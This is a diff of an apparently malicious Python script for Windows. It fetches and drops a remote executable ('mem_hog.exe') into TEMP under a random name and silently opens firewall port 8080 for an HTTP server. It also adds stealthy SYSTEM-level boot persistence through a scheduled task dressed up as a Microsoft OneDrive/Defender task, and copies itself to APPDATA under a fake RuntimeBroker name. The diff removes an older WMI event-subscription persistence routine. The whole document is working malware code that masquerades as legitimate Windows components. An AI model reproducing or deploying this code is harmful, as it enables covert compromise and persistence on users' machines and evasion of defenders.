@@ -5,15 +5,12 @@ import requests
 import urllib3
 import random
 import string
-import psutil
-import wmi
-import win32event
-import win32api
+import psutil, shutil
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"
+GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/mem_hog.exe"
 PAYLOAD_PATH = None
 
 def generate_random_name(length=10):
@@ -23,7 +20,7 @@ def download_payload():
     global PAYLOAD_PATH
     try:
         random_name = f'{generate_random_name()}.exe'
-        destination_path = os.path.join(os.environ('TEMP'), random_name)
+        destination_path = os.path.join(os.getenv('TEMP'), random_name)
         response = requests.get(GITHUB_URL)
         if response.status_code == 200:
             with open(destination_path, 'wb') as f:
@@ -254,69 +251,81 @@ class HTTPHandler(BaseHTTPRequestHandler):
 # Start HTTP server and open firewall
 def start_http_server():
     try:
-        # Add firewall rule for port 80
+        # Add firewall rule for port 8080
         subprocess.run(
-            'netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=8080',
-            shell=True, capture_output=True, text=True, creationflags=0x08000000  # Hide window
+            'netsh advfirewall firewall add rule name="Allow_HTTP" dir=in action=allow protocol=TCP localport=8080',
+            shell=True, capture_output=True, text=True, creationflags=0x08000000
         )
         server = HTTPServer(('0.0.0.0', 8080), HTTPHandler)
         server.serve_forever()
     except:
+        # print(f"Error: {e}")
         pass
 
-# Hide process by mimicking runtimebroker.exe
+# Hide process by mimicking powershell.exe
 def hide_process():
     try:
         for proc in psutil.process_iter(['name']):
-            if proc.info['name'].lower() == 'runtimebroker.exe':
+            if proc.info['name'].lower() == 'powershell.exe':
                 os.environ['COMSPEC'] = proc.exe()
                 break
     except:
+        # print(f"Error in hide_process: {e}")
         pass
 
 # Persistence via schtasks
 def persist_schtasks():
     try:
-        task_name = generate_random_name()
         exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
-        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)  # Hide window
+        appdata_path = os.path.join(os.getenv('APPDATA'), 'RuntimeBrokerHelper.exe') # this will be the PE file name
+        if exe_path != appdata_path:
+            shutil.copy2(exe_path, appdata_path)
+        exe_path = f'"{os.path.normpath(appdata_path)}"'
+        task_name = "OneDrive Startup Task-S-1-5-18-18081254745-36735435435255-3934re6s4246829952-16001"
+        xml = rf"""
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+        <Author>Microsoft Corporation</Author>
+        <Description>OneDrive Runtime Handler</Description>
+        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
+        <Date>2024-01-01T00:00:00</Date>
+    </RegistrationInfo>
+    <Principals>
+        <Principal id="Author">
+            <UserId>NT AUTHORITY\SYSTEM</UserId>
+            <RunLevel>HighestAvailable</RunLevel>
+        </Principal>
+    </Principals>
+    <Triggers>
+        <BootTrigger>
+            <Enabled>true</Enabled>
+            <Delay>PT30S</Delay>
+        </BootTrigger>
+    </Triggers>
+    <Settings>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
+    </Settings>
+    <Actions Context="Author">
+        <Exec>
+            <Command>{exe_path}</Command>
+        </Exec>
+    </Actions>
+</Task>
+"""
+        xml_path = os.path.join(os.getenv('TEMP'), 'gg.xml')
+        open(xml_path, 'w', encoding='utf-16').write(xml.strip())
+        cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
+        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
+        os.system(f'powershell remove-item -path "{xml_path}" -force -erroraction silentlycontinue')
     except:
-        pass
-
-# Persistence via process creation trigger
-def persist_process_trigger():
-    try:
-        connection = wmi.WMI()
-        event_filter = connection.__EventFilter(
-            Name=generate_random_name(),
-            Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
-        )
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-        consumer = connection.Win32_CommandLineEventConsumer(
-            Name=generate_random_name(),
-            CommandLineTemplate=f'"{exe_path}"'
-        )
-        connection.__FilterToConsumerBinding(
-            Filter=f"__EventFilter.Name='{event_filter.Name}'",
-            Consumer=f"Win32_CommandLineEventConsumer.Name='{consumer.Name}'"
-        )
-    except:
-        pass
-
-# Mutex to prevent duplicate persistence
-def persist_mutex():
-    try:
-        mutex = win32event.CreateMutex(None, False, 'Global\\HTTPServerMutex')
-        if win32api.GetLastError() == 0:
-            persist_schtasks()
-            persist_process_trigger()
-    except:
+        # print(f"Error in persist_schtasks: {e}")
         pass
 
 # Main execution
 if __name__ == '__main__':
+    persist_schtasks()
     hide_process()
     download_payload()
-    persist_mutex()
     start_http_server()
